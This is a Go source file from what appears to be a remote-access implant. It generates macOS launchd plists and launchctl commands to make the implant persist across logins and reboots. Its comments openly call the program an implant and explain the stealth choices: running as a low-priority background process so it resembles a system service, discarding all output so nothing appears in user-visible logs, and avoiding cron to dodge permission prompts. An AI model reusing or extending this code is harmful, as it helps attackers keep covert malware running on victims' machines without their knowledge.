package commands

import (
	"fmt"
	"strings"
)

// launchd plist 生成（平台无关，便于在非 macOS 上做内容校验）。
//
// macOS 的持久化只有 launchd 一条正路：LaunchAgent 以登录用户身份在登录时启动，
// LaunchDaemon 以 root 身份在开机时启动。两者共用同一份 plist 结构，差别只在
// 落点目录与需要的权限。
//
// 为什么不写 cron：macOS 的 cron 在新系统上受 TCC 限制、且需要用户授权，
// 而 launchd 是系统原生机制，行为稳定且不弹权限框。

// launchdPlistLabel 默认 label。launchd 用 label 唯一标识一个服务，
// 缺省从可执行文件名派生（保留可读性，运维在 launchctl list 里能认出来）。
func launchdPlistLabel(exeBase string) string {
	base := sanitizeLabelPart(exeBase)
	if base == "" {
		base = "agent"
	}
	return "com." + base + ".agent"
}

// sanitizeLabelPart 只保留字母数字与 - _（label 会进文件名与 launchctl 命令）
func sanitizeLabelPart(s string) string {
	var b strings.Builder
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '-', r == '_':
			b.WriteRune(r)
		}
	}
	if b.Len() > 40 {
		return b.String()[:40]
	}
	return b.String()
}

// buildLaunchdPlist 生成 plist 内容。
//
// args 为启动参数（通常是原始 os.Args[1:]，例如执行口令）—— 不带参数的话，
// 生成时设置了口令的植入体在持久化后会因口令校验失败而直接退出，
// 表现为"持久化成功但重启后再也不上线"。
func buildLaunchdPlist(label, exePath string, args []string) string {
	var b strings.Builder
	b.WriteString(`<?xml version="1.0" encoding="UTF-8"?>` + "\n")
	b.WriteString(`<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">` + "\n")
	b.WriteString("<plist version=\"1.0\">\n<dict>\n")
	b.WriteString(fmt.Sprintf("\t<key>Label</key>\n\t<string>%s</string>\n", xmlEscape(label)))
	b.WriteString("\t<key>ProgramArguments</key>\n\t<array>\n")
	b.WriteString(fmt.Sprintf("\t\t<string>%s</string>\n", xmlEscape(exePath)))
	for _, a := range args {
		b.WriteString(fmt.Sprintf("\t\t<string>%s</string>\n", xmlEscape(a)))
	}
	b.WriteString("\t</array>\n")
	b.WriteString("\t<key>RunAtLoad</key>\n\t<true/>\n")
	b.WriteString("\t<key>KeepAlive</key>\n\t<true/>\n")
	// Background：让 launchd 以低优先级调度，减少对用户的可见影响（也更像系统后台服务）
	b.WriteString("\t<key>ProcessType</key>\n\t<string>Background</string>\n")
	// 输出丢弃：植入体不应往用户可见的位置写日志
	b.WriteString("\t<key>StandardOutPath</key>\n\t<string>/dev/null</string>\n")
	b.WriteString("\t<key>StandardErrorPath</key>\n\t<string>/dev/null</string>\n")
	b.WriteString("</dict>\n</plist>\n")
	return b.String()
}

// xmlEscape 转义 XML 特殊字符（路径/参数里可能出现 & < > " '）
func xmlEscape(s string) string {
	r := strings.NewReplacer(
		"&", "&amp;",
		"<", "&lt;",
		">", "&gt;",
		`"`, "&quot;",
		"'", "&apos;",
	)
	return r.Replace(s)
}

// launchdLaunchArgs 返回把 plist 载入 launchd 的命令候选（新→旧）。
// 新版 macOS 推荐 bootstrap/bootout，但 bootstrap 在部分版本上对已存在的服务报错，
// 因此按顺序尝试，任一成功即可。
func launchdLaunchArgs(plistPath, uid string) [][]string {
	return [][]string{
		{"launchctl", "bootstrap", "gui/" + uid, plistPath},
		{"launchctl", "load", "-w", plistPath},
	}
}
